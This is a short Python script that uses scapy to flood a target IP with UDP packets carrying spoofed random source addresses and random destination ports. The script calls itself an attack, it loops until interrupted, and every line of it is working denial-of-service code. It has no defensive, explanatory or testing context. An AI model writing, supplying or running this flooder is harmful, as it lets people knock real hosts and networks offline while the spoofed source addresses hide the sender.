#!/usr/bin/python3
"""
UDP flood with spoofed source IP and destination port.
"""
import sys
import random
from scapy.all import *

def flood(victim_ip):
	print(f"Attacking {victim_ip}. Press CTRL+C to finish the attack.")
	# scapy will automagically generate random IPs and destination ports for every packet sent
	msg = str(random.getrandbits(1024))
	packet = IP(src=RandIP(), dst=victim_ip) / UDP(dport=RandShort()) / msg
	send(packet, loop=1)

def main():
	if len(sys.argv) != 2:
		print(f"Usage: python3 {sys.argv[0]} <ip>")
		exit(1)
	
	flood(sys.argv[1])

if __name__ == '__main__':
	main()
